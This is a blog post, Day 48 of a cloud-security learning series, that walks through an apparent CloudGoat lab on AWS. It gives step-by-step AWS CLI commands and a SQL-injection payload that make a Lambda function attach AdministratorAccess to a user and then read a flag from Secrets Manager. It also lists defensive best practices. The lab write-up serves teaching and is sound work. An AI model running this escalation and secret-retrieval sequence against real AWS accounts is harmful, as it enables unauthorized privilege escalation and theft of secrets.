---
title: '100 Days of Cloud Security - Day 48: Cloud Security Journey'
date: '2025-12-27'
author: 'Venkata Pathuri'
excerpt: 'Day 48 of my cloud security journey - Cloud Security Journey'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 48: Cloud Security Journey

## Overview
Welcome back to Day 48 of our cloud security journey! Today, we delve deeper into the practical aspects of managing permissions and exploiting vulnerabilities within AWS, building upon our previous lessons about Identity and Access Management (IAM). We’ll explore how permissions can be escalated through roles and how to safely handle sensitive information using AWS Secrets Manager. By understanding these key concepts, you’ll be better prepared to secure your cloud environment while recognizing potential security pitfalls.

## Learning Objectives
In today's session, we will master the ability to:
- Navigate AWS IAM permissions and roles effectively.
- Identify and exploit vulnerabilities in AWS Lambda functions.
- Retrieve sensitive information securely using AWS Secrets Manager.
- Understand the implications of privilege escalation and how to protect against it.

## Deep Dive
### Understanding IAM Permissions and Roles
At the heart of AWS security is the way we manage permissions via IAM. Users like `cg-bilbo-cgid85kbb4yg91` can be granted permissions to perform certain actions, such as `sts:AssumeRole`, which allows them to take on additional privileges. This is crucial in understanding how to navigate and leverage your AWS resources effectively.

In our scenario, the `cg-lambda-invoker-cgid85kbb4yg91` role is pivotal as it allows the user to invoke Lambda functions. Furthermore, the `cgid85kbb4yg91-policy_applier_lambda1` role enables attachment of IAM policies to users—this is where our privilege escalation path begins.

### Analyzing the Lambda Function
Our analysis of the Lambda function `cgid85kbb4yg91-policy_applier_lambda1` revealed a critical vulnerability: SQL injection. This vulnerability allows an attacker to manipulate database queries by injecting malicious SQL code. For instance, when we construct a payload like this:

```json
{
    "policy_names": ["AdministratorAccess' --"],
    "user_name": "cg-bilbo-cgid85kbb4yg91"
}
```

The `--` comment in SQL effectively bypasses any existing checks in the database, granting the attacker elevated permissions.

### Current Best Practices
1. **Input Validation**: Always validate and sanitize inputs to prevent SQL injection and other injection attacks.
2. **Least Privilege Principle**: Grant the minimum permissions necessary for users to perform their tasks. This reduces the risk of privilege escalation.
3. **Regular Security Audits**: Frequently review IAM roles and permissions to ensure they align with current operational requirements and security standards.
4. **Lambda Security**: Ensure that Lambda functions are secure by implementing proper authentication and authorization checks.

## Hands-On Practice
Now, let's put our learning into action! Follow these steps to exploit the Lambda function and retrieve the secret:

1. **Assume the Lambda Invoker Role**:
   ```bash
   aws sts assume-role --role-arn arn:aws:iam::997581282912:role/cg-lambda-invoker-cgid85kbb4yg91 \
     --role-session-name cg-lambda --profile cg
   ```

2. **Configure your AWS CLI with Temporary Credentials**:
   Store the returned temporary credentials and set up a new profile named `cg_lambda`.

3. **Invoke the Vulnerable Lambda Function**:
   Create a payload file `payload.json` with the SQL injection as described. Then execute:
   ```bash
   aws lambda invoke --function-name cgid85kbb4yg91-policy_applier_lambda1 \
     --cli-binary-format raw-in-base64-out \
     --payload file://./payload.json \
     --region us-east-1 \
     --profile cg_lambda \
     out.txt
   ```

4. **Check the Output**: You should see a successful execution response which indicates that the policy was applied.

5. **Retrieve the Secret from Secrets Manager**:
   After obtaining admin privileges, execute:
   ```bash
   aws secretsmanager get-secret-value \
     --secret-id arn:aws:secretsmanager:us-east-1:997581282912:secret:cgid85kbb4yg91-final_flag-vNzQ8U \
     --profile cg
   ```

**Expected Outcome**: You will receive a JSON output containing the secret value.

### Troubleshooting Tips
- Ensure the AWS CLI is configured correctly and that you have the necessary permissions to assume roles.
- If you encounter access denied errors, double-check the IAM policies associated with your user and roles.

## Key Takeaways
Today's lesson has equipped you with the knowledge to analyze IAM roles and permissions, exploit vulnerabilities within AWS Lambda, and securely manage sensitive information through Secrets Manager. Recognizing how to escalate privileges and understanding the underlying security principles are crucial skills in protecting cloud environments.

## Real-World Applications
In production environments, the lessons learned today are invaluable. Organizations must continuously audit their IAM policies to ensure compliance with the principle of least privilege. Additionally, security testing of applications—especially those utilizing serverless architectures like AWS Lambda—is essential to uncover and rectify vulnerabilities before they can be exploited by malicious actors.

---
**Journey Progress:** 48/100 Days Complete 🚀